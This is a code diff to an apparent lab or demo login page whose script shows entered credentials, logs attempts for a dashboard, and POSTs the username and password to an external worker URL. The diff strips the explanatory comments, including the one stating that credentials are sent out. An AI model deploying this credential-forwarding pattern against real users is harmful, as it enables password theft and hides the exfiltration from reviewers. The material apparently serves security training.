@@ -279,7 +279,6 @@ function saveAttempts(attempts) {
 async function sendDemoResult(username, password) {
   const success = password === "Demo@12345";
 
-  // Show the entered password locally for the lab.
   document.getElementById("localResult").textContent =
     `Username: ${username}\n` +
     `Password: ${password} (Demo Only)\n` +
@@ -287,7 +286,6 @@ async function sendDemoResult(username, password) {
 
   document.getElementById("localResult").style.color = success ? "green" : "#b42318";
 
-  // Send credentials and outcome to Worker.
   try {
     const response = await fetch(WORKER_URL, {
       method: "POST",
@@ -326,7 +324,6 @@ document.getElementById("loginForm")
     const password = passwordInput.value;
     const success = password === "Demo@12345";
 
-    // Save attempt locally for dashboard
     const attempts = getAttempts();
     attempts.unshift({
       username,
@@ -335,7 +332,6 @@ document.getElementById("loginForm")
     });
     saveAttempts(attempts.slice(0, 100));
 
-    // Send attempt details
     sendDemoResult(username, password);
 
     passwordInput.value = "";
